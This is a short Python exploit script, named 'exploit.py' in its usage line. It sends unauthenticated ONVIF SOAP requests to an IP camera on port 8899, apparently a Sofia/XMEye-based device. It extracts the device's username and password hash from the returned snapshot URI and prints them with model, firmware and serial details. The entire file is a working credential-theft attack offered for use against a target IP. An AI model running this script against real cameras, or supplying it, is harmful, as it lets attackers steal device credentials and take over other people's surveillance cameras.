import requests
import re
import sys
from html import unescape


def make_request(ip):
    url_device = f"http://{ip}:8899/onvif/Device"
    url_media = f"http://{ip}:8899/onvif/Media"

    headers = {
        "Content-Type": "application/soap+xml; charset=utf-8",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.12.5",
    }

    xml_payload_device_information = """
    <?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
            <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
                <UsernameToken>
                    <Username></Username>
                    <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
                    <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
                    <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
                </UsernameToken>
            </Security>
        </soap:Header>
        <soap:Body>
            <GetDeviceInformation xmlns="http://www.onvif.org/ver10/device/wsdl"/>
        </soap:Body>
    </soap:Envelope>
    """

    xml_payload_snapshot_uri = """
    <?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:xsd="http://www.w3.org/2001/XMLSchema"
                   xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
        <soap:Header>
            <Security xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
                <UsernameToken>
                    <Username></Username>
                    <Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest"></Password>
                    <Nonce EncodingType="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary"></Nonce>
                    <Created xmlns="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"></Created>
                </UsernameToken>
            </Security>
        </soap:Header>
        <soap:Body>
            <GetSnapshotUri xmlns="http://www.onvif.org/ver10/media/wsdl">
                <ProfileToken>000</ProfileToken>
            </GetSnapshotUri>
        </soap:Body>
    </soap:Envelope>
    """


    response_device_information = requests.post(url_device, headers=headers, data=xml_payload_device_information)
    response_snapshot_uri = requests.post(url_media, headers=headers, data=xml_payload_snapshot_uri)

    #print(response_device_information.text)
    #print('\n\n')
    #print(response_snapshot_uri.text)
    #print('\n\n')


    pattern_Manufacturer = re.compile(r'<tds:Manufacturer>(.*?)</tds:Manufacturer>', re.DOTALL)
    pattern_Model = re.compile(r'<tds:Model>(.*?)</tds:Model>', re.DOTALL)
    pattern_FirmwareVersion = re.compile(r'<tds:FirmwareVersion>(.*?)</tds:FirmwareVersion>', re.DOTALL)
    pattern_SerialNumber = re.compile(r'<tds:SerialNumber>(.*?)</tds:SerialNumber>', re.DOTALL)
    pattern_HardwareID = re.compile(r'<tds:HardwareId>(.*?)</tds:HardwareId>', re.DOTALL)

    pattern_SnapshotURI = re.compile(r'<tt:Uri>(.*?)</tt:Uri>', re.DOTALL)

    pattern_UserName = re.compile(r'&user=(.*?)&', re.DOTALL)
    pattern_PasswordHash = re.compile(r'&password=(.*?)$', re.DOTALL)


    Manufacturer = search_by_pattern(pattern_Manufacturer, response_device_information.text)
    Model = search_by_pattern(pattern_Model, response_device_information.text)
    FirmwareVersion = search_by_pattern(pattern_FirmwareVersion, response_device_information.text)
    SerialNumber = search_by_pattern(pattern_SerialNumber, response_device_information.text)
    HardwareID = search_by_pattern(pattern_HardwareID, response_device_information.text)

    SnapshotURI = unescape(search_by_pattern(pattern_SnapshotURI, response_snapshot_uri.text).replace("&amp;", "&"))

    UserName = search_by_pattern(pattern_UserName, SnapshotURI)
    PasswordHash = search_by_pattern(pattern_PasswordHash, SnapshotURI)


    print(f"Device Information:");
    print(f"Manufacturer: {Manufacturer}")
    print(f"Model: {Model}")
    print(f"Firmware Version: {FirmwareVersion}")
    print(f"Serial Number: {SerialNumber}")
    print(f"Hardware ID: {HardwareID}")

    print(f"Snapshot URI: {SnapshotURI}")

    print(f"User Name: {UserName}")
    print(f"Password Hash (Sofia): {PasswordHash}")


def search_by_pattern(pattern, text):
    match = pattern.search(text)
    if match:
        return match.group(1)
    else:
        return None


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("How to use: python3 exploit.py <IP TARGET>\n")
        sys.exit(1)

    make_request(sys.argv[1])

